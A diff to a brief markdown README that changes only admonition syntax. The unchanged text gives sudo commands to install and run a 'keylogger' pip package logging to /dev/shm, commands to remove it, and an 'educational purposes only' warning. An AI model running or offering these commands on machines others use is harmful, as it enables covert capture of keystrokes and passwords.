@@ -1,13 +1,13 @@
 # Command
 
-> [INFO]
+> [!INFO]
 > Install
 ```
 sudo pip3 install keylogger
 keylogger --log-file "/dev/shm/t.log"
 ```
 
-> [INFO]
+> [!INFO]
 > Remove
 ```
 sudo pip3 uninstall keylogger
@@ -15,5 +15,5 @@ sudo rm /dev/shm/t.log
 ```
 
 
-> [WARNING]
+> [!WARNING]
 > Educational purposes only !
